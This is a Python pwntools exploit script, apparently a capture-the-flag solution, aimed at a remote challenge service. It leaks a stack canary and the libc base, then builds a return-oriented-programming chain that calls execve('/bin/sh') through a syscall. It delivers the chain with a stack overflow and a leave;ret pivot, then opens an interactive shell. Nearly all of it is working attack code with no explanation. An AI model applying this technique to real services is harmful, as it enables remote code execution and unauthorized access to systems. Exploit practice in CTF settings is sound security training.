#!/usr/bin/python3

from pwn import *
import sys

libc = ELF('./libc.so.6')

r = remote('ctf.adl.tw', 11007)
# $p leak target address value
rbp = 0x7ffe2a7bc6c0
old_rbp = 0x7ffe2a7bc730
ret_addr = 0x561a3746cb84
__libc_start_main_addr = 0x7f6af4789ab0 # old_rbp + 0x8
libc_base = __libc_start_main_addr - libc.symbols['__libc_start_main']
canary = 0x91a5baee3d327600
code_base = 0x561a3746b000
bss = 0x561a3746b000 + 0x3750
# rbp - 0xA0 = format address
# rbp - 0xA8 = pcast address
print('libc base = ' + hex(libc_base))
print('canary = ' + hex(canary))
#r.sendline(b'info%8$saaaa' + p64(libc_base))

"""
One gadget QQ:
0x4f322
0x4f2c5
0x10a38c
"""

binsh = 0x00000000001b3e9a + libc_base
#pop_rdi_ret = 0x000000000002155f + libc_base
pop_rdx_ret = 0x0000000000001b96 + libc_base
pop_rax_ret = 0x00000000000439c8 + libc_base
pop_rsi_ret = 0x0000000000023e6a + libc_base
pop_rdx_pop_rsi_ret = 0x00000000001306d9 + libc_base
syscall = 0x00000000000013c0 + libc_base
pop_rdi_ret = 0x0000000000001c03 + code_base
jmp_qword_ptr_rbp = 0x0000000000001fb3 + code_base
handle_client = 0x1b7f + code_base
getline = 0x14f7 + code_base
#ROP = p64(binsh) + p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdx_pop_rsi_ret) + p64(0) + p64(0) + p64(syscall)
#pop_rsp_pop_r13_pop_r14_pop_r15_ret = 0x0000000000001bfd + code_base

ROP =  p64(pop_rdi_ret) + p64(binsh) + p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdx_ret) + p64(0) + p64(syscall)
leave_ret = 0x00000000000010f9 + code_base

#r.sendline(b'nameof'+ b'a'*0x38 + p64(canary) + p64(bss) + p64(handle_client))
#r.sendline()
r.sendline(b'nameof'+ ROP + p64(canary) + p64(rbp-0x48) + p64(leave_ret))
r.sendline()

r.interactive()
